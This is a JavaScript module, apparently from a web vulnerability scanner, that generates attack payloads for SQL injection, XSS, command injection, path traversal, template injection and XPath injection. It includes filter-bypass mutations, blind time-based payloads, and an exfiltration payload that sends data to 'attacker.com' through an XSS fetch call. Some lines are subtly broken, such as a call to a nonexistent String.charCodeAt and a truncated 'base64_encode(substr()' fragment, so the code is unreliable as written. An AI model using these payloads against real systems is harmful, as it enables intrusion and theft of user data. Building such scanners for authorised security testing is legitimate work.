// Phase 2: Payload Generator - Generate context-aware test payloads
const VulnerabilityTemplates = require('./vulnerabilityTemplates');

class PayloadGenerator {
  /**
   * Generate intelligent payloads based on parameter type
   */
  static generatePayloads(parameter, vulnTypes = null) {
    const payloads = [];
    const templates = VulnerabilityTemplates.getTemplates();
    const types = vulnTypes || Object.keys(templates);

    types.forEach(type => {
      const template = templates[type];
      if (template) {
        const contextPayloads = this._generateContextAwarePayloads(
          template.payloads,
          parameter,
          type
        );
        payloads.push(...contextPayloads);
      }
    });

    return this._deduplicatePayloads(payloads);
  }

  /**
   * Generate context-aware payloads
   */
  static _generateContextAwarePayloads(basePayloads, parameter, vulnType) {
    const contextPayloads = [];
    const paramClass = parameter.classification || 'generic';

    basePayloads.forEach(payload => {
      // For different parameter types, adjust payloads accordingly
      contextPayloads.push({
        payload: payload,
        type: vulnType,
        encoding: 'plain',
        context: paramClass
      });

      // URL encoded variant
      contextPayloads.push({
        payload: encodeURIComponent(payload),
        type: vulnType,
        encoding: 'url',
        context: paramClass
      });

      // Base64 encoded variant
      if (vulnType !== 'XSS') { // XSS needs decoded
        contextPayloads.push({
          payload: Buffer.from(payload).toString('base64'),
          type: vulnType,
          encoding: 'base64',
          context: paramClass
        });
      }

      // For path-like parameters
      if (paramClass === 'path_like') {
        contextPayloads.push({
          payload: payload.replace(/\//g, '%2f'),
          type: vulnType,
          encoding: 'double_url',
          context: paramClass
        });
      }

      // For search/query parameters - add wildcards
      if (paramClass === 'search') {
        contextPayloads.push({
          payload: `${payload}%`,
          type: vulnType,
          encoding: 'with_wildcard',
          context: paramClass
        });
      }

      // For filter parameters - add operators
      if (paramClass === 'filter') {
        contextPayloads.push({
          payload: `${payload}||true`,
          type: vulnType,
          encoding: 'with_operator',
          context: paramClass
        });
      }

      // For redirect parameters
      if (paramClass === 'redirect_like') {
        contextPayloads.push({
          payload: `javascript:${payload}`,
          type: vulnType,
          encoding: 'javascript_protocol',
          context: paramClass
        });
      }
    });

    return contextPayloads;
  }

  /**
   * Generate payloads for specific vulnerability type
   */
  static generatePayloadsForType(vulnType, parameter = null) {
    const template = VulnerabilityTemplates.getTemplate(vulnType);
    if (!template) {
      return [];
    }

    if (parameter) {
      return this._generateContextAwarePayloads(template.payloads, parameter, vulnType);
    }

    return template.payloads.map(payload => ({
      payload,
      type: vulnType,
      encoding: 'plain'
    }));
  }

  /**
   * Generate polyglot payloads (work for multiple vulnerability types)
   */
  static generatePolyglotPayloads() {
    return [
      '"><script>alert(1)</script>',
      "' OR '1'='1' /*",
      '../../../etc/passwd',
      'javascript:alert(1)',
      '${7*7}',
      '#{7*7}'
    ];
  }

  /**
   * Generate time-based payloads (for blind vulnerabilities)
   */
  static generateTimeBasedPayloads(delaySeconds = 5) {
    return {
      'SQLi': [
        `' AND SLEEP(${delaySeconds})--`,
        `1' OR SLEEP(${delaySeconds})--`,
        `1' AND SLEEP(${delaySeconds}) AND '1'='1`
      ],
      'Command Injection': [
        `; sleep ${delaySeconds}`,
        `| sleep ${delaySeconds}`,
        `$(sleep ${delaySeconds})`
      ],
      'XPath Injection': [
        `' or substring(//password[1],1,1)=chr(${String.charCodeAt(0)}) or '`,
        `' and boolean(substring(//password,${delaySeconds},1)) or '`
      ]
    };
  }

  /**
   * Generate data exfiltration payloads
   */
  static generateExfiltrationPayloads(targetData) {
    return [
      `<img src=x onerror="fetch('http://attacker.com/steal?data=${targetData}')">`,
      `${targetData}' AND SLEEP(${String(targetData).length})--`,
      `${targetData}|base64_encode(substr()`
    ];
  }

  /**
   * Generate mutation payloads (bypass filters)
   */
  static generateMutationPayloads(basePayload) {
    return [
      basePayload,
      basePayload.toUpperCase(),
      basePayload.toLowerCase(),
      basePayload.replace(/script/i, 'scr' + String.fromCharCode(105) + 'pt'),
      basePayload.replace(/script/i, 'SCRIPT'),
      Buffer.from(basePayload).toString('hex'),
      Buffer.from(basePayload).toString('base64'),
      encodeURIComponent(basePayload),
      encodeURIComponent(encodeURIComponent(basePayload))
    ];
  }

  /**
   * Deduplicate payloads
   */
  static _deduplicatePayloads(payloads) {
    const seen = new Set();
    return payloads.filter(p => {
      const key = `${p.payload}:${p.type}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  /**
   * Generate payloads by priority (most likely to succeed first)
   */
  static generatePayloadsByPriority(parameter) {
    const templates = VulnerabilityTemplates.getTemplates();
    const priority = [
      'SQLi', 'XSS', 'SSRF', 'PathTraversal', 'RCE',
      'XXE', 'LFI', 'AuthBypass', 'CSRF', 'PrivilegeEscalation'
    ];

    const payloads = [];
    priority.forEach(type => {
      if (templates[type]) {
        const typePayloads = this.generatePayloadsForType(type, parameter);
        payloads.push(...typePayloads);
      }
    });

    return payloads;
  }
}

module.exports = PayloadGenerator;
